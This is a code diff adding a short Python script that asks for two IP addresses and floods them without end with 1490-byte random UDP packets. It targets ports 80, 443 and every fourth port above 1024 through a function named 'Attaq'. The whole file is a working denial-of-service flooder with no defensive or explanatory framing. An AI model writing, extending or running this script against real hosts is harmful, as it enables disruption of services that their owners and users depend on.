@@ -1,0 +1,28 @@
+import socket
+import random
+
+
+site1 = input("Ip1 ")
+site2 = input("Ip2")
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+def Attaq(site, port):
+    if port==80 or port==443:
+        print(port)
+        sock.sendto(bytes, (site,port))
+        
+    elif (port>=1024) and (port%4==0):
+        sock.sendto(bytes, (site,port))
+    else:
+        pass
+
+sent = 0
+port=1
+while True:
+    print(port)
+    Attaq(site1, port)
+    Attaq(site2, port)
+    port = port + 1
+    if port == 65534:
+        port = 1
